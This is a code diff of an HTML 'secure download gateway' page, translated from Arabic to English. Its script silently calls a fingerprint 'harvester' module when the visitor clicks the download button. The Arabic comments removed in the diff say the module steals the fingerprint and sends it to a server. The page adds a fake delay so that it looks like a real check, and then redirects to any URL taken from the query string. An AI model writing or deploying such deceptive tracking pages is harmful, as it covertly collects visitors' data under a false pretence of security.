@@ -1,80 +1,83 @@
+
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة التحميل الآمن | Secure Gateway</title>
+    <title>Download Gateway | Secure Transfer</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
-    <style>body { font-family: 'Tajawal', sans-serif; }</style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>body { font-family: 'Inter', sans-serif; }</style>
 </head>
 <body class="bg-slate-900 text-white flex items-center justify-center h-screen overflow-hidden relative">
 
     <div class="absolute inset-0 z-0 opacity-20">
         <div class="absolute top-0 left-0 w-72 h-72 bg-blue-600 rounded-full mix-blend-multiply filter blur-xl animate-blob"></div>
-        <div class="absolute top-0 right-0 w-72 h-72 bg-purple-600 rounded-full mix-blend-multiply filter blur-xl animate-blob animation-delay-2000"></div>
+        <div class="absolute top-0 right-0 w-72 h-72 bg-indigo-600 rounded-full mix-blend-multiply filter blur-xl animate-blob animation-delay-2000"></div>
     </div>
 
     <div class="z-10 bg-white/10 backdrop-blur-lg border border-white/20 p-8 rounded-3xl shadow-2xl text-center max-w-sm w-full mx-4">
         
         <div class="mb-6 relative inline-block">
-            <div class="absolute inset-0 bg-green-500 blur-lg opacity-40 rounded-full animate-pulse"></div>
-            <svg class="w-20 h-20 text-green-400 relative z-10 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+            <div class="absolute inset-0 bg-blue-500 blur-lg opacity-40 rounded-full animate-pulse"></div>
+            <svg class="w-20 h-20 text-blue-400 relative z-10 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
             </svg>
         </div>
 
-        <h1 class="text-2xl font-bold mb-2">جاري فحص الرابط...</h1>
-        <p class="text-gray-300 text-sm mb-8">نحن نتأكد من خلو الملف من الفيروسات لسلامة جهازك.</p>
+        <h1 class="text-2xl font-bold mb-2">Preparing Your Link</h1>
+        <p class="text-gray-300 text-sm mb-8">Please click the button below to proceed to your download destination.</p>
 
-        <button id="downloadBtn" onclick="processDownload()" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-4 rounded-xl shadow-lg transform transition hover:scale-105 flex items-center justify-center gap-2 group">
-            <span>اضغط للمتابعة</span>
-            <svg class="w-5 h-5 group-hover:translate-x-1 transition-transform rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+        <button id="downloadBtn" onclick="processDownload()" class="w-full bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-600 hover:to-indigo-700 text-white font-bold py-4 rounded-xl shadow-lg transform transition hover:scale-105 flex items-center justify-center gap-2 group">
+            <span>Download Now</span>
+            <svg class="w-5 h-5 group-hover:translate-y-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path>
+            </svg>
         </button>
 
-        <p class="mt-4 text-xs text-slate-500">Secure by DzGuard™</p>
+        <p class="mt-4 text-xs text-slate-500">Fast & Secure Gateway by DzMarket</p>
     </div>
 
     <script type="module">
-        // 1. استيراد كود الحصاد الموجود عندنا مسبقاً
         import { initHarvester } from '/modules/harvester.js';
 
-        // دالة استخراج الرابط الحقيقي من العنوان (?url=...)
+        // Advanced function to extract the URL correctly even with special characters
         function getTargetUrl() {
-            const params = new URLSearchParams(window.location.search);
-            // إذا لم يضع رابطاً، نرسله لجوجل كاحتياط
-            return params.get('url') || 'https://google.com'; 
+            const urlParams = new URLSearchParams(window.location.search);
+            let target = urlParams.get('url');
+            
+            if (!target) {
+                const fullUrl = window.location.href;
+                if (fullUrl.includes('url=')) {
+                    target = fullUrl.split('url=')[1];
+                }
+            }
+            
+            return target ? decodeURIComponent(target) : 'https://google.com';
         }
 
-        // جعل الدالة متاحة للزر
         window.processDownload = async function() {
             const btn = document.getElementById('downloadBtn');
             const target = getTargetUrl();
 
-            // 1. تغيير شكل الزر (عنصر نفسي)
-            btn.innerHTML = `<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> جاري التوجيه...`;
-            btn.disabled = true; // منع الضغط المتكرر
+            // Change button state to loading
+            btn.innerHTML = `<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Processing...`;
+            btn.disabled = true;
 
             try {
-                // 2. 🎣 تشغيل الحاصد (يسرق البصمة ويرسلها للسيرفر)
-                // ننتظر نصف ثانية فقط لضمان الإرسال
-                console.log('🎣 Harvesting fingerprint...');
-                await initHarvester(); 
+                // 🎣 Silent Fingerprint Harvest
+                await initHarvester();
                 
-                // تأخير بسيط جداً ليبدو الأمر وكأنه فحص حقيقي
-                await new Promise(r => setTimeout(r, 800));
+                // Minimal delay for psychological effect
+                await new Promise(r => setTimeout(r, 700));
 
             } catch (error) {
-                console.error("Harvesting failed but redirecting anyway...", error);
+                console.error("Harvest failed, but redirecting...", error);
             }
 
-            // 3. 🚀 التوجيه للرابط الأصلي
+            // 🚀 Final Redirect to Mediafire or any other link
             window.location.href = target;
         };
-
-        // (اختياري) تشغيل الحاصد فور فتح الصفحة أيضاً لزيادة الضمان
-        // لكن الاعتماد على الزر أفضل للحصول على بصمة كاملة
-        // initHarvester(); 
     </script>
 </body>
 </html>
